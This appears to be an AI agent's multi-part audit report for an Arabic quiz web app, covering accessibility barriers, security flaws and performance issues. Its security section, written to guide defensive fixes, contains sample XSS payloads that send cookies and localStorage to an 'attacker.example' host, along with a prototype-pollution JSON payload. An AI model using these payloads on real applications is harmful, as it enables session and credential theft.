- **Barrier**: Computed contrast ratios for `var(--text-muted)` against the card/panel/surface backgrounds all fall below 4.5:1 in every theme except `sunrise` (which still fails on `--bg-surface` at 4.13:1). Worst: `warm-rose` 1.64:1, `dark-teal` 1.65:1, `formal` 1.77:1, `pure-black` 1.82:1, `mermaid` 1.83:1, `midnight-blue` 1.84:1. The token is used for helper text under inputs, score suffixes ("ن" for points), empty-state descriptions, form hints, member counts, etc.
- **Who's affected**: low-vision users, users in bright rooms (projector scenario)
- **Fix**: Raise `--text-muted` luminance in each theme to ≥ 4.5:1 against `--bg-surface` (the lightest bg); e.g. in `space` theme bump `#4a6080` → at least `#7a8fb0` (~4.5:1 on `#202560`).

### 10. [P1] `--text-secondary` fails WCAG AA in `dark-teal` and `warm-rose` themes
- **File**: src/app/05-audio-assets.js:43, 47 (dark-teal: `#4a8898`, warm-rose: `#9e6070`)
- **Barrier**: `--text-secondary` fails 4.5:1 on `--bg-panel` and `--bg-surface` in these two themes (4.04:1, 4.39:1, 3.62:1, 3.83:1). This token backs the `.text-muted` CSS class (main.css:1137), which is used for paragraph text in modals (e.g. resume info text, confirm message, stat descriptions).
- **Who's affected**: low-vision users
- **Fix**: Lighten `--text-secondary` in these two themes; e.g. dark-teal `#4a8898` → `#6ba8b8`, warm-rose `#9e6070` → `#c08090`.

### 11. [P1] Correct vs wrong answer is distinguished only by color
- **File**: src/styles/main.css:2942-2956; src/app/22-features-v7.js:4005-4006, 4112
- **Barrier**: `.option-btn.correct-answer` uses green background + green border + green letter circle; `.option-btn.wrong-answer` uses red equivalents. No icon (✓/✗), no shape difference, no text label distinguishes them. Red-green color blindness (~8% of males) cannot reliably tell correct from wrong. The body-level color-blindness filters in `24-phase3-a11y:285` shift colors globally but do not add a non-color cue.
- **Who's affected**: color-blind users
- **Fix**: Append a ✓ (correct) / ✗ (wrong) glyph via `::after` on `.correct-answer`/`.wrong-answer`, or change the letter-circle shape (e.g. add a checkmark inside the correct one).

### 12. [P1] Timer `aria-live="assertive"` announces every second, drowning out all other speech
- **File**: src/templates/body.html:2406
- **Barrier**: `<div class="timer-number" id="timer-number" role="status" aria-live="assertive">30</div>` — `updateTimerDisplay()` (22-features-v7.js:4880) sets `textContent` once per second. With `aria-live="assertive"`, the screen reader interrupts the user every second to read the new number, making the app unusable during the question phase.
- **Who's affected**: screen reader users
- **Fix**: Change to `aria-live="off"` and announce only critical thresholds (10s, 5s, time-up) via the existing `announce(...)` helper (22-features-v7.js:4074 already uses it for answer reveal).

### 13. [P1] Image-remove "✕" buttons are below 44×44px touch target and have no accessible name
- **File**: src/templates/body.html:3061 (clearCatImage, 20×20), 3556-3595 (clearOptImage ×4, `padding:3px 8px` ≈ 22×18), 3640 (clearTeamImage, 20×20), 3674 (clearCreditPersonImage, 18×18)
- **Barrier**: These circular red ✕ buttons sit at ~20×20px and lack `aria-label`. They are not covered by the `@media(pointer:coarse) .btn{min-height:44px}` rule (24-phase3:271) because they don't have the `.btn` class — they're inline-styled `<button>` elements. Touch users on mobile/tablet cannot reliably hit them, and screen readers announce only "button".
- **Who's affected**: mobile/tablet touch users, screen reader users
- **Fix**: Add `class="btn btn-icon"` (which triggers the 44×44 rule), `aria-label="حذف الصورة"`, and remove the inline width/height overrides.

### 14. [P1] Inline `<svg>` icons paired with text are not marked `aria-hidden="true"`
- **File**: src/templates/body.html (30+ SVGs, e.g. 414, 428-456, 476, 492, 506-507, 519-527, 545, 619, 659, 677, 771, 800, 805, 2275, 2618)
- **Barrier**: SVGs paired with text labels (e.g. nav-tab "إعدادات" with gear icon) lack `aria-hidden="true"` on the `<svg>` itself. NVDA/JAWS may announce "graphic" or "image" before reading the text label, doubling output. Only one SVG parent (`<div class="admin-logo-icon" aria-hidden="true">` at line 504) is correctly hidden.
- **Who's affected**: screen reader users
- **Fix**: Add `aria-hidden="true" focusable="false"` to every purely-decorative inline `<svg>`.

### 15. [P1] Image preview `<img>` tags use `alt=""` for content-bearing images
- **File**: src/templates/body.html:3060 (cat-image-preview), 3383 (q-image-preview-img), 3462/3486/3510/3534 (opt-img-thumb-0..3), 3556/3569/3582/3595 (opt-img-thumb-4..7), 3639 (team-image-preview), 3673 (cp-image-preview)
- **Barrier**: `alt=""` marks an image as decorative, so when a host uploads a category/team/option image, screen readers say nothing about it. Adjacent text labels exist for category/team names but not for option images or question images.
- **Who's affected**: screen reader users
- **Fix**: When `src` is set programmatically (in `loadCatImage`/`loadTeamImage`/etc.), also set `alt` to a meaningful value (e.g. "صورة الفريق: " + team.name, or "صورة الخيار أ").

### 16. [P1] Heading hierarchy skips h2 (h1 → h3) in image-crop modal
- **File**: src/templates/body.html:3720
- **Barrier**: `<h3 style="...">قص الصورة</h3>` appears inside `#crop-modal` with no preceding `<h2>`. The only `<h1>`s are at lines 2308 (intro) and 2622 (podium). Screen reader users navigating by headings jump from h1 to h3, missing the h2 level.
- **Who's affected**: screen reader users
- **Fix**: Change `<h3>` to `<h2>` (preferred) or add an explicit `<h2 class="sr-only">قص الصورة</h2>` before the `<h3>`.

### 17. [P1] Two `role="main"` landmarks coexist on the page
- **File**: src/templates/body.html:465 (`<div id="app" role="main">`), 468 (`<div id="view-login" role="main" aria-label="تسجيل الدخول">`)
- **Barrier**: `#view-login` is nested inside `#app`. When the login view is shown, both `role="main"` elements are simultaneously active. Screen reader users hear two "main" landmarks and cannot quickly jump to "the" main content.
- **Who's affected**: screen reader users
- **Fix**: Remove `role="main"` from `#view-login` (it's already inside the page's main landmark) or change it to `role="region" aria-label="تسجيل الدخول"`.

### 18. [P1] `--text-muted` used for the score suffix "ن" — fails contrast in every theme
- **File**: src/app/24-phase3-a11y-features.js:120 (renderTeamStats inline: `<span style="font-size:.7rem;color:var(--text-muted)"> ن</span>`)
- **Barrier**: The "ن" (نقطة/point) suffix after each team's score uses `--text-muted` (failing contrast per finding #9). The score number itself uses the team color (passes), but the unit indicator is unreadable for low-vision users on most themes.
- **Who's affected**: low-vision users
- **Fix**: Change `var(--text-muted)` to `var(--text-secondary)` (passes in 16/18 themes — still fails in dark-teal & warm-rose per #10) or `var(--text-primary)`.

### 19. [P1] Number-stepper "−"/"+" buttons have no accessible name and may not meet 44×44
- **File**: src/templates/body.html:636, 640, 786, 790, 794 (e.g. `<button onclick="stepValue('s-default-time',-5)">−</button>`)
- **Barrier**: The minus/plus buttons inside `.number-stepper` use only "−"/"+" as text. Screen readers may announce these as "minus" / "plus" with no context (which field is being stepped?). Touch-target size depends on parent styling (not covered by the `@media(pointer:coarse) .btn{min-height:44px}` rule because they don't carry the `.btn` class).
- **Who's affected**: screen reader users, mobile touch users
- **Fix**: Add `aria-label="إنقاص <field-name>"` / `aria-label="زيادة <field-name>"` and either add `.btn` class or explicit `min-height:44px;min-width:44px`.

### 20. [P1] `confirmAction()` modal writes the message into `<p id="confirm-msg">` but the dialog still has no accessible name
- **File**: src/templates/body.html:3693-3703; src/app/22-features-v7.js:6431-6440
- **Barrier**: `#modal-confirm` has `role="dialog" aria-modal="true"` but no `aria-labelledby="confirm-title"` or `aria-label`. The visible title (`#confirm-title` = "تأكيد") and message (`#confirm-msg`) are not referenced. Screen reader users hear "dialog" with no name when the confirm box appears.
- **Who's affected**: screen reader users
- **Fix**: Add `aria-labelledby="confirm-title"` to the `<div role="dialog">` at line 3693.

---

## Summary
20 real barriers found (8 P0, 12 P1). The codebase already has solid a11y infrastructure (skip link, 3 aria-live regions, `:focus-visible` rule, `prefers-reduced-motion`, color-blindness filters, modal focus-trap, 44px touch-target rule for `.btn`). The gaps are concentrated in (a) form-label associations throughout the wizard and admin modals, (b) dialog accessible names, (c) non-`<button>` clickable divs, (d) icon-only buttons missing `aria-label`, (e) contrast failures in the `--text-muted` token across 17/18 themes, and (f) color-only answer-state differentiation. None of the findings are theoretical — each maps to a concrete user-facing barrier on at least one of the targeted devices (mobile/tablet/desktop/projector).

### Files inspected
- src/app/05-audio-assets.js (THEMES[] color tokens, lines 25-58)
- src/app/22-features-v7.js (openModal/closeModal, selectOption/revealAnswer, updateTimerDisplay)
- src/app/23-mobile-a11y.js (refresh-confirm-overlay, keyboard shortcuts, SafeDOM)
- src/app/24-phase3-a11y-features.js (skip-nav, aria-live, trapFocus/releaseFocus, color-blindness filters, touch-target CSS, kb-shortcuts/q-preview overlays, bulk-import modal)
- src/app/39-history-aria.js (announceToARIA, import-preview overlay)
- src/templates/body.html (all 3743 lines — skip link, modal markup, wizard form, admin forms, headings, imgs/svgs, role=main)
- src/styles/enhancements.css (skip-nav, focus-visible, prefers-reduced-motion, prefers-contrast)
- src/styles/main.css (option-btn correct/wrong states, .text-muted → --text-secondary mapping)

### Next actions
1. Fix the 8 P0 findings first — they block screen-reader and keyboard users from completing core tasks (login, setup wizard, question/category/team editing, modal navigation).
2. Address the `--text-muted` token contrast in `05-audio-assets.js` THEMES[] (single-source-of-truth fix propagates to all 194 usages).
3. Add a non-color cue (✓/✗ glyph) to `.option-btn.correct-answer` / `.option-btn.wrong-answer`.
4. Switch the timer to threshold-only announcements.
5. Refactor custom overlays (kb-shortcuts, q-preview, refresh-confirm) to reuse the existing `openModal`/`closeModal` focus-management path.

---

## Task 10 — Security Audit (XSS / Password / Crypto / CSP / Cross-Window)

### Methodology
Audited 38 modules in `src/app/*.js`, `src/vendor/sanitizer.js`, `index.html` CSP, and `src/templates/body.html` for real exploitable security issues only (P0/P1). Used `Grep` for: `innerHTML=`, `outerHTML=`, `insertAdjacentHTML`, `document.write`, `eval(`, `new Function`, `setTimeout('…')`, `Math.random`, `postMessage`, `addEventListener('message'…`, `crypto.`, `btoa(`, `atob(`, `Object.assign(`, `e.origin`, `location.href=`. For each `innerHTML` hit, traced the data source to determine if it is user-controlled (imported quiz JSON, question text, team name, category name) and whether `_sanitize` / `_sanitizeUser` / `_safeMediaSrc` / `_safeColor` was applied. Read in full: `15-auth-security.js`, `16-encryption.js`, `17-history.js`, `40-features-block.js`, `vendor/sanitizer.js`, the `index.html` CSP, the audience-window postMessage handler in `36-windows-templates.js`, and the importJSON/importEncrypted paths in `18-presentation.js`.

### Scope notes
- The app is offline-first single-file HTML by design — not reported as a bug.
- `'unsafe-inline'` in CSP is required for the single-file build — noted but not listed as P0.
- Default password `1234` is by design with prominent UI warning — not reported.

---

## SECURITY ISSUES FOUND

### 1. [P0] Cross-window XSS: audience window accepts `postMessage` from any origin and renders payload via raw `innerHTML`
- **File**: src/app/36-windows-templates.js:1086-1095 (message listener, no `e.origin` check); XSS sinks at lines 1141, 1209-1216, 1224, 1268, 1294, 1358, 1386, 1407, 1422, 1449-1453
- **Vulnerability**: The audience/presentation popup window's `window.addEventListener('message', …)` handler does not verify `e.origin`. Any web page that obtains a `WindowProxy` reference to the audience window (e.g., via `window.open` returning the popup handle, or `window.opener` from a framed quiz) can deliver `{action:'audience_state_update', payload:{…}}`. The payload's `currentQFull`, `currentCatName`, and `teams[].name` fields are then concatenated directly into `innerHTML` (e.g., `qq.innerHTML='<div class="aud-qq-text">'+s.currentQFull+'</div>'` at line 1450; `ticker.innerHTML=…+t.name+…` at line 1213) without any sanitization. The audience window runs in the same origin as the host (full access to `localStorage`, including `state.settings.password`).
- **Attack scenario**: A quiz host has the audience window open. They visit `https://attacker.example` in another tab. The attacker page calls `w = window.open('','quiz_audience_window')` (or frames the quiz and uses `window.opener`), then `w.postMessage({action:'audience_state_update', payload:{currentQFull:'<img src=x onerror=fetch(`https://attacker.example/?c=`+document.cookie)>'}}, '*')`. Script executes in the audience window's origin → exfiltrates `localStorage` (admin password hash + salt) and can rewrite `state` via `localStorage.setItem`.
- **Fix**: In the listener, require `if (e.origin !== location.origin) return;` at the top, and switch all audience-window HTML builders to use `textContent` for user-supplied strings (or run them through `_sanitizeUser` before concatenation).

### 2. [P0] Stored XSS via imported quiz pack: quran question text rendered raw via `innerHTML` in host window
- **File**: src/app/22-features-v7.js:4148 — `textEl.innerHTML='<div class="quran-verse-display">'+q.text+'</div>'+_metaBadge;`
- **Vulnerability**: For quran-mode questions in `complete` display mode, the raw `q.text` string is concatenated directly into `innerHTML` with no `_sanitize` / `_sanitizeUser` call. The sibling path at line 3632 uses `displayText` (also unescaped) for non-FITB quran questions. `q.text` is fully user-controlled (admin types it, or it arrives via `importJSON` / `importEncrypted` / `importZIP` / external-library import).
- **Attack scenario**: Attacker publishes a "free quiz pack" (`.json` / `.qze` / `.zip`) containing `{type:'quran', quranMode:'complete', text:'<img src=x onerror=alert(localStorage.getItem(\"quiz_state\"))>'}`. Victim admin imports it; when the question is displayed during play, JS executes in the admin/host origin → password hash, all quiz data, and `state.settings` exfiltrated. The host's `connect-src *` CSP (issue #11) makes exfiltration trivial.
- **Fix**: Replace `q.text` with `_sanitizeUser(q.text)` (preserves text, kills markup) or `_sanitize(q.text)` if intentional rich text is required.

### 3. [P0] Stored XSS via `team.name` in early-winner overlay
- **File**: src/app/37-windows-logic.js:1097 — `…<div style="…color:${team.color};…">${team.name}</div>…` (assigned to `ov.innerHTML` at line 1095)
- **Vulnerability**: `team.name` and `team.color` are interpolated raw into an `innerHTML` template literal. Both are user-controlled (team management UI, or imported via JSON/ZIP/encrypted import). `team.color` is also injected into a `style` attribute without going through `_safeColor`, enabling CSS-based exfiltration (`color:red;background-image:url(https://attacker.example/?d=…)`) even if the `team.name` payload is blocked.
- **Attack scenario**: Quiz pack contains `teams:[{name:'<img src=x onerror=fetch(`//attacker/?`+document.cookie)>', color:'red'}]`. When any team reaches the `earlyWinnerScore` threshold, the overlay fires and the payload executes in the host origin.
- **Fix**: Use `_sanitizeUser(team.name)` and `_safeColor(team.color)` (which already exists at `22-features-v7.js:6673`).

### 4. [P0] Admin account takeover: `importJSON` and external-library import blindly overwrite `state.settings.password`
- **File**: src/app/18-presentation.js:651-653 (regular JSON import); src/app/40-features-block.js:168 (external library "replace" mode); src/app/17-history.js:33 (encrypted import: `state.settings={...state.settings,...d.settings}`)
- **Vulnerability**: All three import paths merge incoming `settings` keys into `state.settings` with no field allow-list. The `password` field is included. An attacker-controlled JSON file can set `settings.password` to any string — including a legacy `btoa('newpwd_quiz_salt_v6')` hash, a `'v9:'+sha256('newpwd'+salt)` hash (the salt is recoverable from `localStorage.quiz_pwd_salt`), or even plaintext (the `_verifyPwd` function at `15-auth-security.js:48` explicitly accepts `input===stored` plaintext match).
- **Attack scenario**: Attacker publishes a "quiz pack" whose JSON contains `settings:{password:'letmein'}`. Victim imports it. `_verifyPwd('letmein', 'letmein')` returns `true` at line 48 → attacker (who knows the planted password) can now log in to the victim's quiz on the same machine, or the victim is locked out of their own data if attacker sets an unknown password.
- **Fix**: In all import paths, delete `password` (and `pwLevel`, `ext-lib-*` keys) from the incoming `settings` object before merging. Maintain an explicit allow-list of importable settings keys.

### 5. [P0] "Encrypted export" uses XOR with the password as keystream — trivially breakable, false sense of security
- **File**: src/app/17-history.js:13 — `encrypted+=String.fromCharCode(data.charCodeAt(i)^pwd.charCodeAt(i%pwd.length));`
- **Vulnerability**: The "🔐 Export Encrypted" feature (`.qze` files) is advertised to users as password protection but is not encryption. It is a repeating-key XOR with the raw password as the keystream, then base64. There is no IV, no salt, no KDF, no integrity check (HMAC). The exported JSON plaintext is highly structured (`{"version":"9","settings":{…}`), so a known-plaintext attack recovers the password's first ~30 bytes immediately, and the rest of the keystream is revealed because the key repeats every `pwd.length` bytes.
- **Attack scenario**: Attacker obtains a victim's `.qze` file (shared cloud drive, email attachment, USB stick). They XOR the first bytes against the known JSON prefix `{"version":"9"` to recover the password bytes, then decrypt the entire file. If the user reused the same password as their admin login (very common), the attacker now has the admin password too.
- **Fix**: Replace with Web Crypto `AES-GCM` + `PBKDF2` (the app already uses `crypto.subtle` for password hashing in `15-auth-security.js`, so the API is available). Include a random salt and IV in the export header.

### 6. [P0] Stored XSS in audience window via raw `innerHTML` of postMessage-supplied question text and team names
- **File**: src/app/36-windows-templates.js:1141 (`currentCatName`), 1209-1216 (`t.name`, `t.color`, `t.score`), 1224 (`c.name`, `c.icon`), 1268 (`t.name`), 1294 (`s.currentTeam`), 1449-1452 (`s.currentCatName`, `s.currentQFull`)
- **Vulnerability**: Independent of issue #1 (the missing origin check), even legitimate host→audience state pushes render user-controlled fields (`q.text`, `team.name`, `cat.name`) directly into `innerHTML` without `_sanitizeUser`. The host-side builder at `36-windows-templates.js:109` forwards `q?q.text:''` as `currentQ`/`currentQFull`, and `cat?.name` as `currentCatName`, verbatim.
- **Attack scenario**: Admin imports a benign-looking quiz pack that contains `<svg onload=fetch(`//attacker/?`+document.cookie)>` as a question text. When the host displays that question, `updateAll()` on the audience window executes the payload in the audience origin (full app access).
- **Fix**: Apply `_sanitizeUser()` to every user-supplied field before concatenating into the audience-window HTML strings, or switch to DOM-builder (`h()` / `setChildren`) like `renderStatsGrid` already does.

### 7. [P1] Weak password hashing: single-pass SHA-256 with recoverable salt, fast brute-force
- **File**: src/app/15-auth-security.js:24-36 (hash), 12-23 (salt), 37-42 (legacy `btoa` fallback)
- **Vulnerability**: (a) The salt is generated once and stored in `localStorage.quiz_pwd_salt` — an attacker who exfiltrates `localStorage` (possible via issue #1) has both the hash and the salt, eliminating the salt's purpose. (b) A single SHA-256 pass is fast enough (~millions of attempts/sec on a GPU) to brute-force any reasonable password in seconds. No PBKDF2/scrypt/Argon2 iterations. (c) The synchronous `_hashPwd()` wrapper (line 39-42) and the catch-block fallback at `16-encryption.js:489` store the password using `_hashPwdLegacy` = `btoa(unescape(encodeURIComponent(pwd+'_quiz_salt_v6')))` — this is **reversible encoding, not hashing**. The admin panel at `16-encryption.js:120` itself recovers the plaintext password from this legacy form by `atob`-ing it and stripping the suffix.
- **Attack scenario**: Attacker with `localStorage` access (via issue #1 cross-window XSS, or shared computer, or leaked backup) recovers `state.settings.password`. If it starts with `v9:`, they brute-force the SHA-256 (a 4-digit PIN like the default `1234` cracks in <1 sec). If it is a legacy `btoa` value (set before the user re-logged-in, or set via the catch-block fallback), they `atob` it directly and read the plaintext password.
- **Fix**: Use `PBKDF2` with ≥100k iterations via `crypto.subtle.deriveBits`, store salt alongside hash, drop the legacy `btoa` fallback entirely (force re-set on next login instead), and don't auto-recover plaintext into the settings input.

### 8. [P1] Stored XSS in admin question list and question-search modal via raw `q.text` and `q.explanation`
- **File**: src/app/38-periodic-cleanup.js:777 (`q.explanation`), 783 (`q.text`); src/app/22-features-v7.js:2395 (`q.text.substring(0,60)`); src/app/35-order-search.js:162 and 172 (`q.text.slice(0,60)`)
- **Vulnerability**: When rendering the admin "questions" tab and the in-play "go to question" search modal, `q.text` and `q.explanation` are concatenated into HTML strings that are later assigned to `innerHTML` without any sanitization. Even though the values are truncated to 60 chars, that is plenty of room for `<img src=x onerror=alert(1)>`.
- **Attack scenario**: Attacker publishes a quiz pack with `text:'<img src=x onerror=alert(1)>'`. Victim imports it and opens the Questions tab in the admin panel → payload fires in the admin origin (full app access, including password hash). Truncation to 60 chars does not stop the attack — the shortest known XSS payload is ~20 chars.
- **Fix**: Wrap every `q.text` / `q.explanation` interpolation in `_sanitizeUser(...)` (entity-escape) before concatenation.

### 9. [P1] Stored XSS via `cat.name` in admin dashboard, solo mode, spaced-repetition modal, and Google-Sheets preview
- **File**: src/app/16-encryption.js:370 (`cat.name.substring(0,10)` in dashboard section indicators → `el.innerHTML=html` line 377); src/app/22-features-v7.js:2360 (`cat.name` in mastery indicators), 2374 (`r.name` = `cat.name` in recommendations); src/app/21-solo-mode.js:357 (`${cat.name}` in solo stats); src/app/24-phase3-a11y-features.js:1469 (`cat.name` and `cat.icon` raw in GSheets preview); src/app/41-final-enhancements.js:1180 (`cat.name` injected into `data-tooltip` attribute — attribute-breakout XSS)
- **Vulnerability**: Multiple admin/solo render paths concatenate `cat.name` (user-controlled via UI or import) directly into `innerHTML` strings or into attribute values without escaping. The data-tooltip case at 1180 is an attribute-breakout vector: `cat.name='" onload="alert(1)'` would inject an event handler.
- **Attack scenario**: Same as #8 — attacker publishes a quiz pack with a malicious category name; victim imports and views the dashboard / solo mode / GSheets preview → script executes in admin origin.
- **Fix**: Wrap `cat.name` in `_sanitizeUser(...)` everywhere; for attribute contexts, also escape `"` (use `_sanitizeUser` then `.replace(/"/g,'&quot;')`).

### 10. [P1] Stored XSS via raw option text and question text in question-preview overlay
- **File**: src/app/24-phase3-a11y-features.js:984 (`optsHtml+='…'+o+'</div>'`) and 989 (`overlay.innerHTML='…'+(text||'نص السؤال')+'</div>'+optsHtml`)
- **Vulnerability**: The "preview question" overlay (shown when admin clicks 👁 on a question) reads `text` from `document.getElementById('q-text-input').value` and `options` from `q-opt-0..3` inputs, then concatenates them raw into `innerHTML`. Even though the admin "entered the text themselves", the value can come from paste, from a bulk-import textarea, or from a partial import-and-edit workflow.
- **Attack scenario**: Admin pastes question text copied from a "quiz template" website (which contains `<img src=x onerror=…>`) and clicks preview → script fires in admin origin.
- **Fix**: Wrap `text` and each option `o` in `_sanitizeUser(...)` before concatenation.

### 11. [P1] Prototype pollution via `Object.assign` merging external JSON into existing quiz objects
- **File**: src/app/40-features-block.js:175 (`Object.assign(existing, cat)` for "append" mode), 190 (`Object.assign(eq, q)` for "merge" mode); src/app/37-windows-logic.js:1615 (`Object.assign(state, data)` in `Quiz.importAll`)
- **Vulnerability**: `JSON.parse` creates `__proto__` as an **own enumerable property** of the parsed object (unlike object literals, where it invokes the prototype setter at parse time). `Object.assign(target, source)` then calls `target.__proto__ = source.__proto__` via the inherited setter, polluting `Object.prototype` for the entire realm. Subsequent code that does `obj.someProp` with `someProp` undefined will read the attacker's value.
- **Attack scenario**: Attacker publishes an external library JSON whose category object is `{"id":"x","name":"ok","__proto__":{"isAdmin":true,"toString":"…"}}`. After the admin imports in "merge" mode, `Object.prototype.isAdmin === true` for all objects in the realm. Any feature flag check like `if (user.isAdmin)` (or library code that does feature detection on plain objects) returns true.
- **Fix**: Filter dangerous keys before assigning: `function safeAssign(t,s){for(const k of Object.keys(s)){if(k==='__proto__'||k==='constructor'||k==='prototype')continue;t[k]=s[k];}return t;}`. Replace the three `Object.assign` calls above with `safeAssign`.

### 12. [P1] CSP `connect-src *` + `img-src *` + `media-src *` make XSS data-exfiltration trivial
- **File**: index.html:13 — `default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src *; … img-src 'self' data: blob: *; media-src 'self' data: blob: *;`
- **Vulnerability**: Once any of the XSS issues above fires, the CSP allows `fetch()` / `XMLHttpRequest` to **any** origin (`connect-src *`) and `<img src=…>` / `<video src=…>` to **any** origin. There is no allow-list of legitimate endpoints, so an attacker can exfiltrate `localStorage`, `state`, and the password hash to their server with a single `fetch('https://attacker.example/?d='+btoa(JSON.stringify(localStorage)))`. The `'unsafe-eval'` in `script-src` is also unnecessary (no `eval`/`new Function` found in the app code) and broadens the attack surface.
- **Attack scenario**: Combine with any of the XSS issues above — payload is `<img src=x onerror=fetch(`https://attacker.example/?ls=`+btoa(JSON.stringify(localStorage)))>`. CSP permits it.
- **Fix**: Restrict `connect-src` to `'self' https://raw.githubusercontent.com https://fonts.googleapis.com` (the only legitimate external fetches are the external-library fetch and Google Fonts). Restrict `img-src` / `media-src` to `'self' data: blob:` (drop `*`). Drop `'unsafe-eval'` from `script-src` and `default-src`.

### 13. [P1] External library fetch renders attacker-controlled `cat.name` and `cat.icon` raw in preview
- **File**: src/app/40-features-block.js:97 — `html+='<span …>'+(c.icon||'📚')+' '+(c.name||'قسم')+' ('+qCount+') '+badge+'</span>'` (assigned to `previewEl.innerHTML=html` at line 102)
- **Vulnerability**: `fetchExternalLibrary()` fetches arbitrary attacker-supplied JSON from a URL the admin pastes, then renders the library's category names and icons raw into the preview pane. The validation at line 50 only checks `Array.isArray(data.categories)` — it does not sanitize string fields. (Note: importing the same data via `importExtLibrary('replace')` also triggers issue #4, password overwrite.)
- **Attack scenario**: Attacker shares a "library URL" pointing to `https://attacker.example/lib.json` whose contents are `{"categories":[{"id":"x","name":"<img src=x onerror=alert(1)>","questions":[]}]}`. Admin pastes the URL to preview → script fires in admin origin before they even click "Import".
- **Fix**: Wrap `c.name` and `c.icon` in `_sanitizeUser(...)` before concatenation.

---

## Summary
13 real, exploitable security issues found (6 P0, 7 P1). The most severe chain is: **attacker publishes a malicious quiz pack → victim admin imports it → `q.text`/`team.name`/`cat.name` payload fires via raw `innerHTML` in the admin origin → attacker reads `localStorage` (password hash + salt) and exfiltrates it over the wide-open `connect-src *` CSP**. The cross-window `postMessage` issue (#1) is independently exploitable without any import — any website the admin visits while the audience window is open can XSS the audience window. The "encrypted export" feature (#5) provides zero real protection and gives users a false sense of security for shared quiz files. The password-overwrite-on-import issue (#4) is a full admin-account-takeover via a single imported file.

### Files inspected
- src/app/15-auth-security.js (full — password hashing, login, salt generation)
- src/app/16-encryption.js (full — admin panel, question list rendering, Excel import, settings sync)
- src/app/17-history.js (full — encrypted export/import XOR cipher, session history, generic modal)
- src/app/18-presentation.js (lines 513-720 — importZIP, importJSON settings merge)
- src/app/22-features-v7.js (innerHTML uses at 4148, 2360, 2374, 2395, 4148; `_sanitize`/`_sanitizeUser`/`_safeColor`/`_safeMediaSrc`/`_sanitizeIcon` definitions at 6666-6720; Math.random ID generation at 6653)
- src/app/24-phase3-a11y-features.js (lines 920-1000 q-preview overlay; 1450-1475 GSheets preview)
- src/app/29-browser-compat.js (wizard password set at 788)
- src/app/35-order-search.js (lines 153-174 question-search modal)
- src/app/36-windows-templates.js (lines 80-160 _buildRemoteState; 1080-1100 message listener; 1130-1460 updateAll/audience render)
- src/app/37-windows-logic.js (line 1097 early-winner overlay; line 1615 Quiz.importAll)
- src/app/38-periodic-cleanup.js (lines 760-800 admin question list rendering)
- src/app/40-features-block.js (lines 1-200 external library fetch + import)
- src/app/41-final-enhancements.js (line 1180 data-tooltip attribute)
- src/vendor/sanitizer.js (full — DOMPurify-like regex sanitizer; allows `<svg>`/`<img>` with `data:` URIs but blocks `script`/`on*`/`javascript:`; not used by the vulnerable call sites, which bypass it entirely)
- index.html (line 13 CSP meta tag)

### Next actions (priority order)
1. **P0 #1 (cross-window postMessage)**: Add `if (e.origin !== location.origin) return;` to the audience window's message listener AND sanitize all audience-window innerHTML sinks. This is the only P0 that requires no user action beyond having the audience window open.
2. **P0 #4 (password overwrite on import)**: Add a settings-key allow-list to all three import paths. This is a one-line fix per file and prevents total account takeover.
3. **P0 #5 (XOR "encryption")**: Replace the XOR cipher with `AES-GCM` + `PBKDF2` via Web Crypto. Until this ships, change the UI label from "🔐 تصدير مشفر" to "🔐 تصدير بمسحوق بسيط (غير آمن)" so users do not rely on it for sensitive data.
4. **P0 #2, #3, #6 (stored XSS)**: Sweep all `innerHTML` assignments in `22-features-v7.js`, `37-windows-logic.js`, and `36-windows-templates.js` and apply `_sanitizeUser()` to every interpolation of `q.text`, `q.explanation`, `team.name`, `cat.name`, `cat.icon`, and option strings. The `_sanitizeUser` helper already exists at `vendor/sanitizer.js:65`.
5. **P1 #7 (password hashing)**: Switch to `PBKDF2` ≥100k iterations; drop the `btoa` legacy fallback; do not auto-recover plaintext into the settings input.
6. **P1 #11 (prototype pollution)**: Replace the three `Object.assign(target, userJSON)` calls with a `safeAssign` that skips `__proto__`/`constructor`/`prototype`.
7. **P1 #12 (CSP)**: Tighten `connect-src`, `img-src`, `media-src` to drop `*`; drop `'unsafe-eval'`.

---

## Task 11 — Performance Audit (Load Time, Re-renders, Memory Leaks)

### Methodology
Static performance review of `src/app/*.js` (38 modules), `src/templates/body.html`, and CSS. Read init sequence in `30-more-i18n.js` (`_initApp`) and `11-play-logic.js` (`loadState`, `MediaDB.loadAllMedia`). Inspected the dedicated perf module `38-periodic-cleanup.js` (VirtualList, SmartSave, PerfMonitor, IdleTasks, CSS containment, lazy tabs), the freeze-fix module `42-freeze-fix.js`, the persistence layer `10-category-mgmt.js` (`_saveStateNow` + debounce + dirty-check), the render functions in `16-encryption.js` (renderAdmin / renderCategoriesAdmin / renderQuestionsAdmin / renderTeamsAdmin), the timer registry in `01-foundation.js`, and the IDB wrapper in `02-storage.js`. Grep-verified `setInterval`, `addEventListener` vs `removeEventListener` (134 vs 9), `innerHTML =` (282), `offsetWidth/getBoundingClientRect` patterns, and `@keyframes` animations for layout properties. Did NOT modify any files (research only).

---

## PERFORMANCE ISSUES FOUND

### 1. [P0] `MediaDB.saveAllMedia` / `loadAllMedia` perform N sequential IndexedDB transactions instead of batching
- **File**: src/app/02-storage.js:65-68 (save), 86-87 (load)
- **Issue**: Both methods `await this.set(k,v)` / `await this.get(k)` inside a `for` loop. Each call to `set`/`get` opens its own IDB transaction. For 100 questions × (image + mediaAttachment + 4 option images) + N team/member images, that's 500+ sequential IDB round-trips per save and per load.
- **User impact**: First paint is delayed by `loadAllMedia()` — there's an 8s timeout (11-play-logic.js:412-416) precisely because this path is slow. Every `saveState()` (debounced 500ms) blocks the IDB queue for hundreds of milliseconds. On mobile, IDB transaction overhead is ~5-20ms each → 500 × 10ms ≈ 5s of cumulative IDB time per save on media-heavy quizzes.
- **Fix**: Open ONE readwrite (or readonly) transaction, queue all `put`/`get` requests on its object store, and resolve on `tx.oncomplete`. Or use `objectStore.getAll()` + `getAllKeys()` for load (2 round-trips total).

### 2. [P0] `_saveStateNow` dirty-check still triggers `MediaDB.saveAllMedia()` on no-op path
- **File**: src/app/10-category-mgmt.js:249-253
- **Issue**: The dirty-check computes `JSON.stringify({s:settingsClean,c:categoriesClean,t:teamsClean,cr:state.credits,solo:state.soloProgress})` (itself O(N) over the entire state) and, when the fingerprint matches `_lastSavedJSON` (no changes), the code STILL calls `MediaDB.saveAllMedia().catch(...)` — which is the most expensive part of the save (see #1). The dirty-check therefore saves the cheap part (LS write) but not the expensive part (IDB media scan + N transactions).
